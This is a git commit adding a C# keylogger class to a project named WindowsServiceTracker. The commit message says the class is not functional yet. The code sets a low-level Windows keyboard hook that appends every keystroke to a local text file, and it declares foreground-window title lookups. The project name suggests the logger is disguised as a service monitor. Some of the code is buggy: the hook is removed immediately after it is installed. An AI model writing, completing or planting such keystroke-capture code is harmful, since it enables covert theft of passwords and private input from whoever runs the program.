98b5948a75568b7189a0aee3cb42c5db6906dd50
CharlieMB <cbfireflurry@gmail.com>
2014-01-26 16:33:24 -0600

    added kelogger class (not functional yet)

---
+++ WindowsServiceTracker/WindowsServiceTracker/KeyLogger.cs
@@ -0,0 +1,112 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.IO;
+using System.Text;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+
+namespace WindowsServiceTracker
+{
+    class Keylogger
+    {
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+        private static LowLevelKeyboardProc _proc = HookCallback;
+        private static IntPtr _hookID = IntPtr.Zero;
+        private Thread loggingThread = null;
+
+        public Keylogger()
+        {
+        }
+
+        private void KeyloggerThread()
+        {
+            try
+            {
+                _hookID = SetHook(_proc);
+                UnhookWindowsHookEx(_hookID);
+            }
+            catch (ThreadAbortException)
+            {
+            }
+        }
+
+        private void Start()
+        {
+            if (loggingThread == null)
+            {
+                loggingThread = new Thread(new ThreadStart(KeyloggerThread));
+                loggingThread.Start();
+            }
+        }
+
+        private void Stop()
+        {
+            if (loggingThread != null || !loggingThread.IsAlive)
+            {
+                try
+                {
+                    loggingThread.Abort();
+                }
+                catch (ThreadAbortException)
+                {
+                }
+            }
+        }
+
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                StreamWriter sw = new StreamWriter("keylogTEST.txt", true);
+                sw.Write((Keys)vkCode);
+                sw.Close();
+            }
+            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        }
+
+        private static IntPtr SetHook(LowLevelKeyboardProc proc)
+        {
+            using (Process curProcess = Process.GetCurrentProcess())
+            using (ProcessModule curModule = curProcess.MainModule)
+            {
+                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
+            }
+        }
+
+        [DllImport("User32.dll")]
+        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey); // Keys enumeration
+
+        [DllImport("User32.dll")]
+        private static extern short GetAsyncKeyState(System.Int32 vKey);
+
+        [DllImport("User32.dll")]
+        public static extern int GetWindowText(int hwnd, StringBuilder s, int nMaxCount);
+
+        [DllImport("User32.dll")]
+        public static extern int GetForegroundWindow();
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook,
+            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+            IntPtr wParam, IntPtr lParam);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+    }
+}
